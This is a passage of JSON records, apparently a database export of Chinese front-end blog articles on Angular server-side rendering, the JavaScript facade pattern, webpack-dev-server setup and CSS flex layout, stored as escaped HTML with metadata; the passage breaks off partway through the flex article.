class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.transData(res)\n          \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.state.set(DETAIL_KEY, res \u003cspan class=\"hljs-keyword\"\u003eas\u003c/span\u003e any)\n          \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.loading = \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e\n        })\n      })\n    } \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e {\n      \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.transData(\u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.details)\n    }\n  }\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e代码够简单清晰，和上面描述的原理一致\u003c/p\u003e\n\u003cp\u003e现在我们只需要对 \u003ccode\u003emain.ts\u003c/code\u003e 文件进行小小的调整，以便在 \u003ccode\u003eDOMContentLoaded\u003c/code\u003e 时运行我们的代码，以使 \u003ccode\u003eTransferState\u003c/code\u003e 正常工作：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e\u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e { enableProdMode } \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'@angular/core'\u003c/span\u003e\n\u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e { platformBrowserDynamic } \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'@angular/platform-browser-dynamic'\u003c/span\u003e\n\n\u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e { AppModule } \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'./app/app.module'\u003c/span\u003e\n\u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e { environment } \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'./environments/environment'\u003c/span\u003e\n\n\u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (environment.production) {\n  enableProdMode()\n}\n\n\u003cspan class=\"hljs-built_in\"\u003edocument\u003c/span\u003e.addEventListener(\u003cspan class=\"hljs-string\"\u003e'DOMContentLoaded'\u003c/span\u003e, () =\u0026gt; {\n  platformBrowserDynamic().bootstrapModule(AppModule)\n    .catch(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003eerr\u003c/span\u003e =\u0026gt;\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(err))\n})\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e到这里运行 \u003ccode\u003enpm run build \u0026amp;\u0026amp; node dist/server.js\u003c/code\u003e 然后刷新 \u003ccode\u003ehttp://localhost:4200/detail/add\u003c/code\u003e 到控制台查看 network 如下：\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/3/160bb6e3598620ef?w=1323\u0026amp;h=746\u0026amp;f=png\u0026amp;s=-1\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e发现 XHR 分类里面没有发起任何请求，只有 service-worker 的 cache 命中。\u003c/p\u003e\n\u003cp\u003e到这里坑都踩完了，项目运行正常，没发现其它 bug。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e总结\u003c/h2\u003e\n\u003cp\u003e2018 第一篇，目的就是探索所有流行框架服务端渲染的实现，开辟了 angular 这个最后没尝试的框架。\u003c/p\u003e\n\u003cp\u003e当然 Orange 还是前端小学生一枚，只知道实现，原理说的不是很清楚，源码看的不是很明白，如有纰漏还望指教。\u003c/p\u003e\n\u003cp\u003e最后 Github 地址和之前文章一样：https://github.com/OrangeXC/udao\u003c/p\u003e\n\u003cp\u003eGithub 附有在线链接，好的就说到这了\u003c/p\u003e\n","buildTime":"1514979800.8482","__v":0}
{"_id":{"$oid":"5a4cc287fa7d97296c4556cc"},"id":"5a18cff5f265da432717ec71","author":{"$oid":"5a4b770f19da8721f49c06fb"},"imageCache":[{"imageUrlArray":[],"screenShot":null}],"title":"JavaScript设计模式系列四之外观模式(附案例源码)","meta":{"likeCount":0},"tag":["JavaScript","前端","设计模式"],"comment":[],"shortContent":"深入系列文章部分是有先后顺序的，按照目录结构顺序阅读效果最好。 如果有疑问或者发现错误，可以在相应的 issues 进行提问或勘误。 深入系列文章部分是有先后顺序的，按照目录结构顺序阅读效果最好。","content":"\u003ch1 class=\"heading\"\u003e文章初衷\u003c/h1\u003e\u003cblockquote\u003e\n\u003cp\u003e设计模式其实旨在解决语言本身存在的缺陷,\u003c/p\u003e\n\u003cp\u003e目前javaScript一些新的语法特性已经集成了一些设计模式的实现,\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e大家在写代码的时候,没必要为了用设计模式而去用设计模式\u003c/strong\u003e,\u003c/p\u003e\n\u003cp\u003e那么我这边为什么还写设计模式的文章呢,\u003c/p\u003e\n\u003cp\u003e一方面是自己的一个整理,然后记录出来,结合自己的理解,\u003c/p\u003e\n\u003cp\u003e一方面就是虽然语言特性本身已经实现这些模式,有了自己的语法,\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e但是我们何尝不能去了解一下它是通过什么样的思路去实现了\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e在我看来设计模式更多的是让我对于思考问题,有了一些更好的思路和想法\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e文章实现更多的表现为用一些简单的案例,帮助大家去理解这样的一种思路,\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e会存在故意把设计模式的实现往简单的案例靠拢,\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e大家在真实项目中不要刻意去用设计模式实现相同的代码\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e设计模式在平时的一些代码中都会有所体现,大家也许经常用到,\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e耐心看文章,也许你会发现自己平时的代码就不断在设计模式中体现\u003c/strong\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch1 class=\"heading\"\u003eJavaScript设计模式系列\u003c/h1\u003e\u003cblockquote\u003e\n\u003cp\u003eJavaScript设计模式系列,讲述大概20-30种设计模式在JavaScript中的运用\u003c/p\u003e\n\u003cp\u003e后面对应的篇幅会陆续更新,欢迎大家提出建议\u003c/p\u003e\n\u003cp\u003e这是设计模式系列第四篇,讲述外观模式\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e\u003ca href=\"https://juejin.im/post/59c474c15188256c4b725557\"\u003e上篇文章讲述了单例模式,有兴趣可以查看\u003c/a\u003e\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e注意\u003c/h2\u003e\u003cp\u003e\u003ca href=\"https://github.com/ToNiQian/js-design-mode\"\u003eJavaScript设计模式系列github地址\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e深入系列文章部分是有先后顺序的，按照目录结构顺序阅读效果最好。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e勘误及提问\u003c/h2\u003e\u003cp\u003e如果有疑问或者发现错误，可以在相应的 issues 进行提问或勘误。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e外观模式\u003c/h2\u003e\u003ch3 class=\"heading\"\u003e概念:\u003c/h3\u003e\u003cblockquote\u003e\n\u003cp\u003e为一组复杂的子系统接口提供一个更高级的统一接口,\u003c/p\u003e\n\u003cp\u003e通过这个接口使得对子系统接口的访问更容易\u003c/p\u003e\n\u003cp\u003e外观模式又被称作为门面模式\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch3 class=\"heading\"\u003e案例体现\u003c/h3\u003e\u003cp\u003e有一个需求,要为\u003ccode\u003edocument\u003c/code\u003e元素绑定一个点击事件,这时候我们就需要考虑到浏览器的兼容性问题,但是每次绑定事件都要去判断一些浏览器兼容,显然不是很合理,这时候我们就要用到外观模式了,封装一个统一的绑定事件方法,然后在这个方法里面去做浏览器兼容性的处理,统一暴露一个对外绑定事件的方法,\u003cbr\u003e这就是我们所说的外观模式了\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e代码体现\u003c/h3\u003e\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e// 外观模式实现\n\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e addEvent(dom, \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e, fn){\n    // 对于支持dom2级事件处理程序 addEventListener 方法的浏览器\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e(dom.addEventListener){\n        dom.addEventListener(\u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e,fn,\u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e);\n    }\u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e(dom.attachEvent){// 对于不支持addEventListener 方法但支持attachEvent 方法的浏览器\n        dom.attachEvent(\u003cspan class=\"hljs-string\"\u003e'on'\u003c/span\u003e+\u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e,fn);\n    }\u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e {\n        dom[\u003cspan class=\"hljs-string\"\u003e'on'\u003c/span\u003e+ \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e] = fn;\n    }\n}\n\n// 调用绑定事件\naddEvent(document.getElementById(\u003cspan class=\"hljs-string\"\u003e'btn'\u003c/span\u003e),\u003cspan class=\"hljs-string\"\u003e'click'\u003c/span\u003e,\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003efunction\u003c/span\u003e\u003c/span\u003e(){\n    console.log(\u003cspan class=\"hljs-string\"\u003e'我是点击事件'\u003c/span\u003e);\n});\u003c/code\u003e\u003c/pre\u003e\u003ch3 class=\"heading\"\u003e外观模式的优点\u003c/h3\u003e\u003cul\u003e\n\u003cli\u003e提供统一对外接口,把复杂逻辑统一处理,对外调用更加容易\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 class=\"heading\"\u003e外观模式总结\u003c/h3\u003e\u003cp\u003e在javascript中,外观模式是比较好理解的,\u003ccode\u003ejQuery\u003c/code\u003e当中就大量运用了这\u003c/p\u003e\n\u003cp\u003e样的思想去解决浏览器兼容性问题\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e注意\u003c/h2\u003e\u003cp\u003e\u003ca href=\"https://github.com/ToNiQian/js-design-mode\"\u003eJavaScript设计模式系列github地址\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e深入系列文章部分是有先后顺序的，按照目录结构顺序阅读效果最好。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e关于设计模式,更多的是结合我自己的一些理解,把他总结出来分享给大家,如果大家发现有什么不正确的地方,\u003ccode\u003e希望大家一定得提出来\u003c/code\u003e,避免我这边误人子弟,感谢大家!!!\u003c/h3\u003e","buildTime":"1514934694.991","__v":0}
{"_id":{"$oid":"5a4cc287fa7d97296c4556ce"},"id":"5a27eda26fb9a0450e75ffc1","author":{"$oid":"5a4cc287fa7d97296c4556b6"},"imageCache":[{"imageUrlArray":["https://user-gold-cdn.xitu.io/2017/12/6/1602bf897c23d9b6?w=1241\u0026h=622\u0026f=png\u0026s=220211","https://user-gold-cdn.xitu.io/2017/12/6/1602bf897bceeaaa?w=1202\u0026h=161\u0026f=png\u0026s=70745"],"screenShot":null}],"title":"webpack 3 零基础入门教程 #7 - webpack-dev-server 就是这么简单","meta":{"likeCount":0},"tag":["Webpack"],"comment":[],"shortContent":"现在我们来学习一个最常用的插件 webpack-dev-server，一般来说，这个插件，大家都会用，特别是开发环境下。 我们之前使用 webpack -d --watch 来在开发环境下编译静态文件，但是这个功能，完全可以用 webpack-dev-server 来代替。 除…","content":"\u003cp\u003e现在我们来学习一个最常用的插件 \u003ccode\u003ewebpack-dev-server\u003c/code\u003e，一般来说，这个插件，大家都会用，特别是开发环境下。\u003c/p\u003e\n\u003cp\u003e我们之前使用 \u003ccode\u003ewebpack -d --watch\u003c/code\u003e 来在开发环境下编译静态文件，但是这个功能，完全可以用 \u003ccode\u003ewebpack-dev-server\u003c/code\u003e 来代替。\u003c/p\u003e\n\u003cp\u003e除此之外， \u003ccode\u003ewebpack-dev-server\u003c/code\u003e 还有其他的功能，比如在本地上开启服务，打开浏览器等。\u003c/p\u003e\n\u003cp\u003e这节我们主要来简单体验一下 \u003ccode\u003ewebpack-dev-server\u003c/code\u003e 的功能。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u003cspan class=\"hljs-comment\"\u003e# 先全局安装\u003c/span\u003e\n$ npm install -g webpack-dev-server\n$ npm install --save-dev webpack-dev-server\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e然后运行命令：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e$ webpack-dev-server\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/6/1602bf897c23d9b6?w=1241\u0026amp;h=622\u0026amp;f=png\u0026amp;s=220211\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e现在我们用浏览器打开 \u003ccode\u003elocalhost:8080\u003c/code\u003e 也可以看到以前的效果。\u003c/p\u003e\n\u003cp\u003e下面是编译后的源码。\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/6/1602bf897bceeaaa?w=1202\u0026amp;h=161\u0026amp;f=png\u0026amp;s=70745\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e默认是运行在 \u003ccode\u003e8080\u003c/code\u003e 端口，这个我们可以改。\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003ewebpack.config.js\u003c/strong\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003evar HtmlWebpackPlugin = require(\u003cspan class=\"hljs-string\"\u003e'html-webpack-plugin'\u003c/span\u003e);\nconst ExtractTextPlugin = require(\u003cspan class=\"hljs-string\"\u003e'extract-text-webpack-plugin'\u003c/span\u003e);\n\nmodule.exports = {\n  entry: \u003cspan class=\"hljs-string\"\u003e'./src/app.js'\u003c/span\u003e,\n  ...\n  devServer: {\n    port: 9000\n  },\n  ...\n};\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e我们还可以配置一运行 \u003ccode\u003ewebpack-dev-server\u003c/code\u003e 的时候就自动打开浏览器。\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003ewebpack.config.js\u003c/strong\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003evar HtmlWebpackPlugin = require(\u003cspan class=\"hljs-string\"\u003e'html-webpack-plugin'\u003c/span\u003e);\nconst ExtractTextPlugin = require(\u003cspan class=\"hljs-string\"\u003e'extract-text-webpack-plugin'\u003c/span\u003e);\n\nmodule.exports = {\n  entry: \u003cspan class=\"hljs-string\"\u003e'./src/app.js'\u003c/span\u003e,\n  ...\n  devServer: {\n    port: 9000,\n    open: \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e\n  },\n  ...\n};\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e以后都会一直用 \u003ccode\u003ewebpack-dev-server\u003c/code\u003e 的啦。\u003c/p\u003e\n\u003cp\u003e先这样吧。\u003c/p\u003e\n","buildTime":"1514963450.1662","__v":0}
{"_id":{"$oid":"5a4b771019da8721f49c070d"},"id":"599970f4518825243a78b9d5","author":{"$oid":"5a4b770f19da8721f49c06f0"},"imageCache":[{"imageUrlArray":["https://user-gold-cdn.xitu.io/2017/8/21/395302ae7949d78570a6102e5ded1ff0","https://user-gold-cdn.xitu.io/2017/8/20/33cd4b214e7c0ef7a6b0951c5eb79d97","https://user-gold-cdn.xitu.io/2017/8/20/54272308d484c291a12805e55a5bbb42","https://user-gold-cdn.xitu.io/2017/8/20/7bc6f5073e763bdadba7b3d0b1b4165e","https://user-gold-cdn.xitu.io/2017/8/20/7ebcd44736415553ac21c8190720ba97","https://user-gold-cdn.xitu.io/2017/8/20/73919fb9c2f38dfb5da243494b1afb0f","https://user-gold-cdn.xitu.io/2017/8/22/565bd12982aba0859944ee2c4849f9bd","https://user-gold-cdn.xitu.io/2017/8/20/7338ceeeef84002756ae9da28ce9408f","https://user-gold-cdn.xitu.io/2017/8/20/8bd84cd223d886c10c4321f84b957a1d","https://user-gold-cdn.xitu.io/2017/8/20/f0f195ab789f428b77048a5f9f5029a8","https://user-gold-cdn.xitu.io/2017/8/20/337974db1b847cd76284f0212e8c18e9","https://user-gold-cdn.xitu.io/2017/8/20/38f7b20197c66a4023e8ae7c2359ce49","https://user-gold-cdn.xitu.io/2017/8/20/8ce63d57d844623ec8ac69fdaea145a2","https://user-gold-cdn.xitu.io/2017/8/20/b32a73e3d6fee2259eb2215fbde7649d","https://user-gold-cdn.xitu.io/2017/8/20/f097d6eeb2d30ba3e2639239ae414bd5","https://user-gold-cdn.xitu.io/2017/8/20/9bc9d5224b3d0d2970b2f62dc990456c","https://user-gold-cdn.xitu.io/2017/8/20/a2d49458713678dea41afe1b4a190a87","https://user-gold-cdn.xitu.io/2017/8/20/e41c9e0e7d472e0906a9a7c339476d29","https://user-gold-cdn.xitu.io/2017/8/20/d2e76b9a3878f766d976d060152087a5","https://user-gold-cdn.xitu.io/2017/8/20/0b6f92930f17f283e7c97eba2497d55a","https://user-gold-cdn.xitu.io/2017/8/20/21f7b2a8ffec994e6e4e56983f5c60bf","https://user-gold-cdn.xitu.io/2017/8/20/be393b8ce9267ae2e0001cb4d457681c","https://user-gold-cdn.xitu.io/2017/8/20/77446497022ddff4294ba277dbeee225","https://user-gold-cdn.xitu.io/2017/8/20/a437f5a1f6759f37b1abd2b5b58cd18c","https://user-gold-cdn.xitu.io/2017/8/20/72bdd4dda24e729abdc96785162d76ec","https://user-gold-cdn.xitu.io/2017/8/20/326b7e1856e61524c26322e510271c95","https://user-gold-cdn.xitu.io/2017/8/20/7b94bc787ab1af8e2abba584d97136f8","https://user-gold-cdn.xitu.io/2017/8/20/0aaa209d325e7f0c68b37b071be73df0","https://user-gold-cdn.xitu.io/2017/8/20/0b45387b08f3a1fc55f7fc29fd38ebd4","https://user-gold-cdn.xitu.io/2017/8/20/4c8a876364205f37368a57e378746b5f","https://user-gold-cdn.xitu.io/2017/8/20/666841916ea971f4705b439282c86658","https://user-gold-cdn.xitu.io/2017/8/20/732fedf7ebd5eeb817f9a522bbdff6ea","https://user-gold-cdn.xitu.io/2017/8/20/88386947f106680912f2b889917891a6","https://user-gold-cdn.xitu.io/2017/8/20/00913c0a5f49e94f13dd4a0bf5eea826","https://user-gold-cdn.xitu.io/2017/8/20/42def5aa9d3b4df14c230506074b7ee0","https://user-gold-cdn.xitu.io/2017/8/20/929b5b13e3a9396bc4b43c8daaf275c4","https://user-gold-cdn.xitu.io/2017/8/20/f4fbde95e4aa19f9ac021138e0106fdf","https://user-gold-cdn.xitu.io/2017/8/20/5cca9436df9669d9abebdf7f8fd49c94","https://user-gold-cdn.xitu.io/2017/8/20/f83bca0c0e71b7dfb497853f0f5035ad","https://user-gold-cdn.xitu.io/2017/8/20/61d393d131af1b12351d76dd2e2c288c","https://user-gold-cdn.xitu.io/2017/8/20/7a4250b9d54bc95ed5816955a711b1be"],"screenShot":null}],"title":"CSS 常见布局方式","meta":{"likeCount":0},"tag":["CSS","前端"],"comment":[],"shortContent":"本文思维导图，欢迎补充 本文首发于我的个人网站：http://cherryblog.site 前言 温馨提示：本文较长，图片较多，本来是想写一篇 CSS 布局方式的，但是奈何 CSS 布局方式种类太多并且实现方法太多，所以本文主要是介绍 flex 布局和 grid 布局，以及 C…","content":"\u003cp\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/8/21/395302ae7949d78570a6102e5ded1ff0\" alt=\"本文思维导图，欢迎补充\"/\u003e\u003cfigcaption\u003e本文思维导图，欢迎补充\u003c/figcaption\u003e\u003c/figure\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e本文首发于我的个人网站：\u003ca href=\"http://cherryblog.site\" target=\"_blank\"\u003ehttp://cherryblog.site\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch1 id=\"-\"\u003e前言\u003c/h1\u003e\n\u003cp\u003e温馨提示：本文较长，图片较多，本来是想写一篇 CSS 布局方式的，但是奈何 CSS 布局方式种类太多并且实现方法太多，所以本文主要是介绍 flex 布局和 grid 布局，以及 CSS 常见的居中方式和两种经典的布局方式“圣杯布局”和“双飞翼布局”。想到哪写到哪，请各位见谅。\u003c/p\u003e\n\u003ch1 id=\"-\"\u003e传统盒模型布局方式\u003c/h1\u003e\n\u003cp\u003e我们的传统布局方式就是通过盒模型，使用 \u003ccode\u003edisplay\u003c/code\u003e 属性（文档流布局） + \u003ccode\u003eposition\u003c/code\u003e 属性（定位布局） + \u003ccode\u003efloat\u003c/code\u003e属性（浮动布局）。这个大家都比较熟悉，没有掌握的同学再去恶补一下基础\u003c/p\u003e\n\u003ch2 id=\"-\"\u003e文档流布局\u003c/h2\u003e\n\u003cp\u003e这是最基本的布局方式，就是按照文档的顺序一个一个显示出来，块元素独占一行，行内元素共享一行，这个相信大家都比较熟悉了，就不再赘述了\u003c/p\u003e\n\u003ch2 id=\"-\"\u003e浮动布局\u003c/h2\u003e\n\u003cp\u003e浮动方式布局就是使用 \u003ccode\u003efloat\u003c/code\u003e 属性，使元素脱离文档流，浮动起来。这个大家也比较熟悉，就不再赘述了。\u003c/p\u003e\n\u003ch2 id=\"-\"\u003e定位布局\u003c/h2\u003e\n\u003cp\u003e我们也可以通过 \u003ccode\u003eposition\u003c/code\u003e 属性来进行定位，这个大家也比较熟悉了，就不再赘述了。\u003c/p\u003e\n\u003ch1 id=\"flex-\"\u003eflex 布局\u003c/h1\u003e\n\u003cp\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/8/20/33cd4b214e7c0ef7a6b0951c5eb79d97\" alt=\"flex布局\"/\u003e\u003cfigcaption\u003eflex布局\u003c/figcaption\u003e\u003c/figure\u003e\u003cbr\u003e仅仅通过上述的三种布局方式还是有一些缺陷，比如我们不能只使用一个属性来实现垂直居中布局，所以就产生了第四种布局方式：flex 布局。\u003c/p\u003e\n\u003ch2 id=\"-flex-\"\u003e什么是 flex 布局\u003c/h2\u003e\n\u003cblockquote\u003e\n\u003cp\u003e2009年，W3C 提出了一种新的方案----Flex 布局，可以简便、完整、响应式地实现各种页面布局。目前，它已经得到了所有浏览器的支持，这意味着，现在就能很安全地使用这项功能。\u003c/p\u003e\n\u003cp\u003eFlex 是 Flexible Box 的缩写，意为\u0026quot;弹性布局\u0026quot;，用来为盒状模型提供最大的灵活性。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003eflex 是一种新型的布局方式，使用该布局方式可以实现几乎所有你想要的效果。但是要注意其浏览器的兼容性，flex 只支持 ie 10+，所有还是要根据你的项目情况使用（没错，我们要求至少 ie 9，(ಥ_ಥ)）。\u003cbr\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/8/20/54272308d484c291a12805e55a5bbb42\" alt=\"flex 的浏览器支持情况\"/\u003e\u003cfigcaption\u003eflex 的浏览器支持情况\u003c/figcaption\u003e\u003c/figure\u003e\u003c/p\u003e\n\u003ch2 id=\"-flex-\"\u003e使用 flex 布局\u003c/h2\u003e\n\u003cp\u003eflex 的使用方法很简单，只需要将其 \u003ccode\u003edisplay\u003c/code\u003e 属性设置为 \u003ccode\u003eflex\u003c/code\u003e 就可以，也可以设置行内的 flex，记得 Webkit 内核的浏览器，必须加上 \u003ccode\u003e-webkit\u003c/code\u003e 前缀。\u003cstrong\u003e注意，设为 Flex 布局以后，子元素的 \u003ccode\u003efloat\u003c/code\u003e、\u003ccode\u003eclear\u003c/code\u003e 和 \u003ccode\u003evertical-align\u003c/code\u003e 属性将失效。\u003c/strong\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs css\"\u003e   \u003cspan class=\"hljs-selector-class\"\u003e.ele\u003c/span\u003e{\n       \u003cspan class=\"hljs-attribute\"\u003edisplay\u003c/span\u003e: -webkit-flex;\n       \u003cspan class=\"hljs-attribute\"\u003edisplay\u003c/span\u003e: flex;\n       \u003cspan class=\"hljs-attribute\"\u003edisplay\u003c/span\u003e: inline-flex;\n       \u003cspan class=\"hljs-attribute\"\u003edisplay\u003c/span\u003e: -webkit-inline-flex;\n   }\u003c/code\u003e\u003c/pre\u003e\u003cblockquote\u003e\n\u003cp\u003e在 flex 中，最核心的概念就是容器和轴，所有的属性都是围绕容器和轴设置的。其中，容器分为父容器和子容器。轴分为主轴和交叉轴（主轴默认为水平方向，方向向右，交叉轴为主轴顺时针旋转 90°）。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e在使用 flex 的元素中，默认存在两根轴：水平的主轴（main axis）和垂直的交叉轴（cross axis）\u003cbr\u003e主轴开始的位置称为 \u003ccode\u003emain start\u003c/code\u003e，主轴结束的位置称为 \u003ccode\u003emain end\u003c/code\u003e。\u003cbr\u003e同理，交叉轴开始的位置称为 \u003ccode\u003ecross start\u003c/code\u003e，交叉轴结束的位置称为 \u003ccode\u003ecross end\u003c/code\u003e。\u003cbr\u003e在使用 flex 的子元素中，占据的主轴空间叫做 \u003ccode\u003emain size\u003c/code\u003e，占据的交叉轴空间叫做 \u003ccode\u003ecross size\u003c/code\u003e。\u003c/p\u003e\n\u003cp\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/8/20/7bc6f5073e763bdadba7b3d0b1b4165e\" alt=\"flex基本概念\"/\u003e\u003cfigcaption\u003eflex基本概念\u003c/figcaption\u003e\u003c/figure\u003e\u003c/p\u003e\n\u003ch3 id=\"-\"\u003e父容器属性\u003c/h3\u003e\n\u003cp\u003e父容器上有六个属性\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#flex-direction\" target=\"_blank\"\u003eflex-direction：主轴的方向。\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"flex-wrap\" target=\"_blank\"\u003eflex-wrap：超出父容器子容器的排列样式。\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003eflex-flow：\u003ccode\u003eflex-direction\u003c/code\u003e 属性和 \u003ccode\u003eflex-wrap\u003c/code\u003e 属性的简写形式。\u003c/li\u003e\n\u003cli\u003ejustify-content：子容器在主轴的排列方向。\u003c/li\u003e\n\u003cli\u003ealign-items：子容器在交叉轴的排列方向。\u003c/li\u003e\n\u003cli\u003ealign-content：多根轴线的对齐方式。\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 id=\"-span-id-flex-direction-flex-direction-span-\"\u003e\u003cspan id=\"flex-direction\"\u003eflex-direction 属性\u003c/span\u003e\u003c/h4\u003e\n\u003cp\u003eflex-direction 属性决定主轴的方向（\u003cstrong\u003e主轴的方向不一定是水平的，这个属性就是设置主轴的方向，主轴默认是水平方向，从左至右，如果主轴方向设置完毕，那么交叉轴就不需要设置，交叉轴永远是主轴顺时针旋转 90°\u003c/strong\u003e）。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs css\"\u003e.ele {\n  flex-direction: row;                // 默认值，主轴为水平方向，起点在左端。\n  flex-direction: row-reverse;        // 主轴为水平方向，起点在右端。\n  flex-direction: column;             // 主轴为垂直方向，起点在上。\n  flex-direction: column-reverse;     // 主轴为垂直方向，起点在下。\n}\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/8/20/7ebcd44736415553ac21c8190720ba97\" alt=\"flex-direction 属性\"/\u003e\u003cfigcaption\u003eflex-direction 属性\u003c/figcaption\u003e\u003c/figure\u003e\u003c/p\u003e\n\u003ch4 id=\"-span-id-flex-wrap-flex-wrap-span-\"\u003e\u003cspan id=\"flex-wrap\"\u003eflex-wrap 属性\u003c/span\u003e\u003c/h4\u003e\n\u003cp\u003e\u003ccode\u003eflex-wrap\u003c/code\u003e 属性决定子容器如果在一条轴线排不下时，如何换行。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs css\"\u003e.ele {\n flex-wrap: nowrap;          // 默认，不换行\n flex-wrap: wrap;            // 换行，第一行在上方。\n flex-wrap: wrap-reverse     // 换行，第一行在下方。\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/8/20/73919fb9c2f38dfb5da243494b1afb0f\" alt=\"flex-wrap 属性\"/\u003e\u003cfigcaption\u003eflex-wrap 属性\u003c/figcaption\u003e\u003c/figure\u003e\u003c/p\u003e\n\u003ch4 id=\"justify-content-\"\u003ejustify-content 属性\u003c/h4\u003e\n\u003cp\u003e\u003ccode\u003ejustify-content\u003c/code\u003e 